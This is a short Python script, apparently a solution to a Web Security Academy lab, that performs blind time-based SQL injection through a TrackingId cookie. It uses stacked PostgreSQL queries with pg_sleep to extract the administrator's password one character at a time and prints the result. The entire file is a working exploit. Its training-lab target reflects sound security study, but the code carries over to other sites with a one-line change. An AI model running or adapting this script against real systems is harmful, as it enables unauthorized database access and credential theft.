import time
import string
import requests

url = 'https://ace61f931e4fb316809b1b2b00890088.web-security-academy.net/filter?category=asdf'
pwn = ''

for j in range(1,30):
    for i in string.printable:
        cookies = {"TrackingId":"asdf'; SELECT CASE WHEN (username='administrator' and substring(password,1," + str(j) + ")='" + (pwn+i) + "') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"}
        start = int(time.time())
        response = requests.get(url,cookies=cookies)
        end = int(time.time())
        if end - start >= 10:
            pwn += i
            print(pwn)
            break

